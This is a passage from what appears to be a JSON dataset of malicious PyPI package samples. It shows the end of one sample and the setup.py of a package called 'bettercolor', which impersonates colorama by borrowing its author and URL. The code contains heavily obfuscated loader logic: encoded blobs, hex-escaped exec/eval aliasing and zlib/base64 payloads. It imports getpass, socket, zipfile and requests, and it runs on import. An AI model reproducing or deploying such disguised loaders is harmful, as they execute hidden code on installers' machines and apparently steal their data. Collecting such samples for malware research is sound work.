}>XGT`@EdGVq@Qo=|x{L$x!V}a2=VuX^HIj{@FUR7X?9OmP#Nsi=Wdad)uhzq88iIzVoc<huc&GYth*BOBS%A|cvu|TO$$oe;GB1EbR7}E}w~l=ZApn0O$f?S5jb~-ve5(BbWsZ*j?mLIGPn&enWn-vcd&!u#y=K{!-0S2!kgp=j{Dfi;oqyft;S#xPg;uG+ZmweKr-zruPbOOaPH|E2v!i9qlL02HuMa~k^PS$8gaOjbzg2`zbk{}2C^C}-6cg{g=)QVIU6m$!konYVyEHsiH4-36(tTFX9dfH+#NqfY-sXxll(*tzeDA(`oOybdZVwU?@ql<P>ge7E(vMN%B%90S8ri{<(<eA(3Cn{*lp6#(A9A0c+L&bz1q$y58ZSh9YY6~CL0#HXnQesp><UQeco^5smojQz7LQRV=0<`WwDL&KN4|L0G$;*JFpv22r(kGehlxC$x-(T1$=vA_!8A&6P&m2_olS^B7dOo@UHc$JY751hM<2|Abiehbz=JAoX2Jn$Xo_`Jo0&E`dKG`1_SrNLzt3FgLufEoU3ZX2eLW`cK$!Z+sNMRmUP9&`t}uuy7WG8#Tof<LQ;|{b?dS2{*ADhM#@5@H^nJE<w9R+Kd-K-;E^5L#Mao0fRMxD%R&c6+Z)I^=9~kyeeP04Cs4UQ%M#u|A$yTojKIPvIO@@;>1qdMasb}#Ms%mG2ieC{He7n}!oIKHLwa7wNO8zy1&o*&U8DFWfmZE$}OU|RnctYy20bV3WVZX(UIEbz^82Zn5b%j=VD_{Ob#Zh*pH$zwb1-><g+)gh4c#ypS<LH<|spF07LlnrvRQc6roFhhzdi@Dq1?|KJ;E?+fFN?=wiRiYNj$lsRua5}xYOrYh;#QR&czK+=!Z4O*d72tcW6jG<r<+QBqM65o&<dm~<M)t0Cv-L6lvlJOgp_5)e_U5f6a6;9u2D2>t(Ya;<lf=tM};ir^m55~*<D+rtFaD20go^Uz<L)#7p9!e1q@|s%@}pQ=3T6%q;UfgWxA)M=21{{upUc__XC!DtzV(Cy=xSh0ng?l(940VV@;DtF(xgQPXbzqq0)hI#21NncAKU%-}l?{$>wkc3AnNMEalC}VLGF*CAK#x^&2Ku=9o+nl8;yC_^c8L4zh$?^=-|avqOLJQay?lOI3riFNUe%DlC`R0NcGE$&-75Dg`1mh&g-)Nl6DYS+s6LSSzaUBRHS5;0TNhJ~sdI6g`WfIxYhigL(KmG$gHyCl@=nF0Ic&P>Z+)RnKN;up9l=et7Rfo|Q;a!UN|%#9%#EYMdKOohM3#uucp;oOkXZX78|u7EeL75%$d~pkLzXboh!0v>l2+rnMqiqqn%v(^{fwkmc?L-$I6HP)KsQY!Y(da$n5SYPz{JeLGeT#F6Ch1TX$~XSp;Ae|(O3b>qi(4BIl3i320#=<S+j=6uOuRD1Kjl|L6sm1Wy!s6sDVgpoNn&-AZaIyBIE7vEM9qyg&zj3z|!5gSj}PL3bMxpOKzoL}imExfjq@$tBo(wyDZ3)#tBKeFM39@e$dCJMV!c+ZQ^@Ih-(#G)6i=bN5KIo=CM{6Dd(Y+H8Rz6%mydZB=g;1&cRPyG1J%9w$Q#N;%E`qA_FQBc=g`-9zr@}UXnfWBhF60G78{?a7FbM){Mo0^0hd^?SJPJVl>csEtZ4vMTwAs+v^#P06V3=HT+hH0*{{%SXpEd_xb4-1C++id7r+G>>ZTn;b>R19x%I4OXfkCQvAe-)Oe?zFoO*A%bI;C>lrnZbL`snELW<nZ^R(zp3%=$dD+B;S^=BQy?iF8E~L9WhP_z0XwLi{qe}DT-\nVO%<X2dEV*|jP!rij{7BW#si;^1{2SUsH={ROt(*fHVm`dk8c=I~$yaxdHl4y&W2&<-t{tew6gd53<^6i!2!v3!FWe{OTNUlzw@hOh^?wJt2yrc)CkLmYsV$$lQkRZMn(fMES*9HiXl`R5U*i@~<3Zl~@Hbp;L&sHhzLvFm7<+bv#s64yotPj=)V96<)+!|}piIn`Jk)@HiF%&EzjkgMqIQ3;oJDo<1^1URZA)&wOOih-3H5$9ygSMR>{Wu9;f=Dg=E4YIeVJH{Bl)&}UOpy*g|!YYxD>l3mjW?#kZ63(B*hwibi+=jgu3ur&el<Hfj#^->|Q}H6yKxw7*ofsFT}hK(KjdB)6TX'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n\nfrom .src_file import *\nfrom colorama import *\ninitialize()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-04-bettercolor-v3",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='bettercolor',\n    version='3',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\n#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\nimport getpass\nimport os\nimport socket\nfrom zipfile import ZipFile\nimport requests\ndef initialize():\n    obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decrypt)'],['''73y&GqPR(El6Cy|8u!6JFCv564b{;ZPb|%0350vXGkzC{tFFn;WmNa>Z_@z(zI4qPlF?TOmPfiNetNqEf#f34Vx#6mY%@p7M3Z@hiq^`T|GZHhJv#i6vv8X5rlE(&28NqNh%^k?{xx^BIUzC@MR;?0cc$2uv|pXboqMT7MC?!`w|46~h?m#mGtu8+R&ftxyKFb1|DP>>#yJoUWavuZr~*@w0<<Jz($pAWK~B%G?{lJ|@VI&_g$fz$1Ugv@w3g`{r+ru2HF!vqNk11S3w4-|C8ZtyU6R<n-YZBPT`r4OM78z!pHKa>J0@0HXz+I#{Cq?9yk=+03}oW^!F2&dF%n57-o+N8Nv#Yr-CABKF_sa;u1%gpmznFa^%NTMpqcIyjL}743UmDYn~!W?gTh%T+(Yhi)^hW6Slk!&SQKQFK;6_)Nt6!J`?wdvj427&qA!Hjd;l-pJc7cdJJO)Ook-gBf%mk2wfXI`_4x;t%fPh5^R^#?IJT;vD#4h!4@)ZoO3RlLw{=AbmTtkWJ0&Z(9n1q!3p_+b-@(d-kOeLqe^A3yT8U~2Qnh$AGGUDcb5st1rcSmsHQ%;_xaUQ%G{{uxas+vWO4rAJJ!^V$3qPsjD|a{1@VAyAsvaU=A@a^HVxR5tpRlkY&?HOy3b=vw%zQ0hlw{-<i)umt{<k9l2Q?YJqa1!im$Andd)2mw9m>oPgi8d7<Pz0#YlFjptltt@BCN}H&Le*Aa-q5DbC0~z^lmWqkEz0k=ns?#cyz9@DP^TW>I}9OeCQ!GIwz6a4#v%45WMVG`W09yruf)%qD-R&iO7T{VaA(Lwi9^otrAr!SK(_)Cx|j{ZDDb`C>~x)4|SvDx>|c4f~zNWZ|ieUJRyq1Ef1j0eqO5<t^QnScNJXb;oyVORtci+;UVVj+W8M7H5~z~eMi35L|*hR$dLh+B40%&9nJy@@<wf}mgF!@!r4T}sK%Bl7uiZaZt}Q8h`sd~3Dh#EK^qJJ&3y1Q`<==9HT;z3=-?eo7QQ!*<}AfS#Qrwjb8kU(Q7U8O@8@q62SgLWTE*dn6c=7HM(0VCEd^1BcaGptzOrzx-yFjL?VugP19a_@EMKYGPp$>~H(NluYz`Pr-_T5nMJi`2_Bi6W!Ho27jNU{>#l?cO!36Dp?Y2p<(rSZfaiP;pu7_8Wnpu#P+*q<LSb0-3Xhzk(Qk`|U=yn57i!=_Tg^FYzoJP&`P)Xe<bg>sr4hx5pEpaR=tAgTqtPzkW#a@h#Gzg>kOIveUdqHf_5n;s}(~@iWuD_$o1FlC}ubRfgvIxQVMj5+{KmHxk;s4w2BW9io+L#89RqQb(mq6d`;J<`}kITou(>uhx_R~BEsw?G#zKs=YVps$ovwqBr*%3yZ^EJa`u0p20P7s$e^awnnn!Dp7vD!jtCyr)-W`d>H!K{0)zTk#VTc||h>f$Mlh6)RGD7)uwWy0rb$W=W5@^Uyh80@Lgg=g;FpAH|~HFfhMVQ@gZ3&RknO;K&~n;R}Z%p%pUccyNAknEBwWBYA_M)mA2=yq|xb}eN3M2ioC^I}^kx{qlHO${a5^jakYEcMiYqJ}Yr%C&(Lll?rl|NrGmS)<!s?SGV6XcQqzm5uW-y{Bd8`dQff-InnI#pg3JAN+5;S7BeD)W1!LQE+E&q#^lEDJ6EU*naPuoPHjYfH-7zHYGQjop0hb4TZ}}SBZjnqXW!QL!s(=7f(qdSQlc+bjtcMqvvs?F#mLQuXTRBBk4ogS}?s^E713=Zbfe8ou^{?Uyx5;)U9RPkGQ7cJ;hiBZ0z>rNo78{Ph~yAp$?(-F;Td?DoIBC%$3J%|Fq$_aCG8<Wmq{gKB@fKmCxWwdv{-Ms>SAj^Wiit&i{C$No^3pv5fS&Mki3)uodn4P6~naEMizLKOSR!Obr>r_Dt5k=2<&hXVTf7O|TnNKCp4{my`gHdslIyfJq~`N*EK&9<sLcYNh9c$Kujr6#UdpzCVz^c_;T$QYm_ifW&m?1jC_N3;B)TVe*-)yXHzKhQSiQv~E@`C0Oleb*yYUbrT<^UCWv~xL&<-+1#R{6{we)Pqrb&2+zSFCqey)h0V7=G8(?TDV{$G0;UjF%zD+l?=}ZP(zP4qzp@z;ts9g$VB#VK#2;xqK9!Y{D`0F`4JvFnk<h-@Sd~>xcz(_)4DqOFa9ax^C*hu%eBjY{u19v7JJEZy2rGrY7C@Z&Vm&`HSUJBrqHKhhK~z(*JIaorTyrxQUQ32s;n9>8FJt+?%-KPFuI8A>D6bZjs_o`Q!A?m1xrmm}pJPGs$c1*d7UT^u9uarbs`>5bj<5vgWF`0~{}`-{o(@=>uYX6Q4YO{Pxmwx)a_^DcD*<BIy*7`-#n=0J2lnXcVgI<Q0qR?FU%zw{&j@l2BTCzI8>u&yN+GL(UdY}dlZ4O;VwB(DHma=>2T?kHW>xt*WT%*J56G28+Tgq};n+ksC2gjCj_xYhXM{byv=9&~tGj{6@xv{$zC=SBt)6eDoHAb~$AB43d;^u?;Y#rJr%LNwo4uGgI!*0n;_#n;KtD6<(ud*l&FLm<(Wj&Ba2e^+LwDXn2u3MQgQa9&P&8G^z34o&;Uj)xgoAPR(XbY<xP!O-A$c_~T_D7ATc1^+r-7Mz(L!so16hi2_!lffj@5{_UDai#^xxux)jc#Wok}Iszc}iq+MW)I4K)8Q9k#qAOrn<ZRw(Ho<|hW~R<ZWI#FL4eOhtKW?ik;gOw}B<GUyL3{ng>NeBDdAz~<cU;Hfkrba-hsCjrj!E!WG&Wt**Avp#;#m!+2C6qTR2@L4$plJ&X+fzw`T7Tl&~+_a>!FDb?m%F;;D+s#zI$`6t;rDK3$N7RLv^m80MLQnJaaCv%NhT8N6dHAj{j;b3rk<aXX$kxcsHY<l$XQWNmvO<=d5#oq4Jmc}^7SaDgODXx)LWXrvgLY?_U%Gp1^)E>K48IM0Ys1`>_J5}9J#|a=QdJJX#LkT83~2(@II5pSMTl5@4Nt#8->W@cpCvP>7I_k{n+Sl3uopf<LWc&?frPR#tnk1{*0|3z%lCv!ZW8DwqM6yfhyB%&oYxd149ZZ-<w5|<s|X=7EDZd6W;J~9kgGO`6pJ8BIC10a2D5lMK3rA>ng&J5Bj{u)QkP=BDL}n<MvoJ{<2~L9P0dexM4spcD|{#lu{gYP{~Gwn49I^pV*%aKSs(S1!P;jC+I51h?08PbF)uUvg#XGhH#qRkc1;Cir6?bFV!~em04>>2^T2yQiph)3#g$<T1O9#bn$$8-^6QB}BGjJJd(WKa%zNksoy^yFD={HHP<C+NU2T>10#x{!nmVy;y^xD>d5;Sky0-Tca!MEUEUvp>1wF3)h};6RQ(CT@Pidk7^&Fl@3{{bMQk2?csF%(N6RP&vW&8B778M4znHY|mh1S<X-_sv0Q}7+D?m@7axP)tDFnGhYG<<^TKLlF7F42&D--#>n0l4@Hih%d#@LaWO7<w}fUJF*~h=)pwb_z#9_^^N6{3lpUYL<;Je_XrioAx7@1cd)<M8;B?c093}u*#vLx@D?Ab(QXVBz|JfnB2P}S4{T45$V{dUO&)W87()cP$YNu4!2th&~UONh)G~H_AesJhe&qpAtutjER4{pF8kij#GqR(3W?X?$4o10ntzhYTLGRt2*{b-ASUpj?_x47Agi2e<ek7sHQ#j2-)<wkk|zkG>RQ~!(neRcwWulu8RdKu%e0Bn`xPW>L+OZZCqRnLXSEXW$Mv+wA=HCTj=#Hc85kZy+W(MOF5^l?d-NX(X<MQF7Hz@`7k!)cF)&3}0~Ei2paALCKg33!OX@xRmZJ#+23uBb9W%os|K!a*E^*vcn37FFZy#;_=YarHh4+rkr8ed!94()apaY-^|MG#Fut-_<aF|hehRWw&n)l59$wjb>)YLMTA-_WO#$LzSY9m*M5o75PC^vo{RC|U$I_BEFNSdt^1o~_OG_?w{DC-A?B7CF%5KuKyCG{{osTq}$qXl!#1t16vN}qhl`CqgEUe=07Q~^u5I~U&nVLZPauCW4NShFz`-`G&$jkCh>S2UxgyT}BV=U6lbe-avEw633HWT5N1O&8b`K8zb%yFDVUF{(aLIn;AI-x~SVxCt|x8kK(ik9O2Y*&XVFq&H3KtpBIPm$TlSDHccdMQL4hVeqRf25ncr)kI}V{58SwFZVo!hug(r<!idUXLH?O$fhS^P}4j6k$0Q~MA6tD0&{B6^~iDjX$11Bsn#$qh--GiR>g66QJgZN;h<i4R`gX0E^&TVFru}&KTrA*oHcE0$mz_>GA)_h+D*eJ3sifqB!*L*?_-<}aXufT3@j7&lfOXh&+2rYlkT^T85i?Xsi$TCwE81iMV23S@JQlP>c_VEhM&HnTUC2uvmq`Z1dx<#NNs2oOUTe*U8QdQ&|WUK9H0VhLe=`IL`gXrOBYyWL5Lv?g6fxY55@z;5kxM1rp%M)X{T9)&r|6PJ~%QrNZdaDlp38ib-\nWQh5ro$1=9Naxto6dyC)!4d^*jFHC8N`@GK{u|VzphvWD+WaX1rlpQipw>{atW7g&JSqBkuN*vP69_Dm9Hntk{m)jpdVUdN3ZLrBUGUD<s@hw@4IHT0^c%v|NH>#~D<a?1}ns5ld!mNvGxLCaoChJ_E$0DUeKW2EY5gS~A6o7)jYaA@FpS9xUt@3qSk6%GqVunro1umz3=<_&HO=8LMXM0Bufhj?xkn9qSnQL;}Bx+9TLN1ng>yh<+9O8WCSRZ?B)=`=*9kGUKG(5GAr`U998Yls2KFwy!plFn=66%-lz@ar!LUkY90R$V3ksi8xK3L`PW^`F@e*tyS+DpqDX&`l(FRu2Jlpu$FCg;}E5pU&)1`+A{(gh68KPIJ%*-HEYblriO2fb*z2StuU&BhbdcZ*EbKPt{AZok6Qn0?*o0~f=q|b7Ih*LX~jBYooN1u4Oge=R9Xe|YD%J$^~+ZGqj0rCRb3NZx;_B)v44h<Y#HwFs|w6frKTDR?iXrdAI0WeL!f(^aVu*7qzNp2zNzg8dyY?K)neu5-;d9u_QEgq3df1fhhGcVuu)$nVWnw}+fL#XxR7eKU>PjHuh(EzoNm`a@|1GDHeDWo$1KHo*2(LlzaqJtUE`}<{ET7l;Ct2^zwtnwcaCLg?B$3*!wJipm+}5^1b)m_x|Bm`XQqNVC7%p<R76PQ9woT0jw|f~>R=9MKxLpW%3k-w^p>S$i9YiZeyJ9W%F1{b5Pba?8ZPk%A3E?f))f+=oI<g4vm2Co4ke0rd!xF2RQv!K4;?^Mk`OzhH*Ax4c$V^V4}?^X48c@=mDfIa-5nJ#VwGEIzU%sBMK>)yoP1QdVeF^`^XpyR`atqm-U=R79!!V_aN^kVKX!E-3VTVt_7rsf!>`zr-2!)q#P35hU7pkZ01p<;CQ)P+mcb+|zGPth*fc9N{a)q!;y#bm!1^S7QFkaGC0$pX@N9<=o;rHV'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 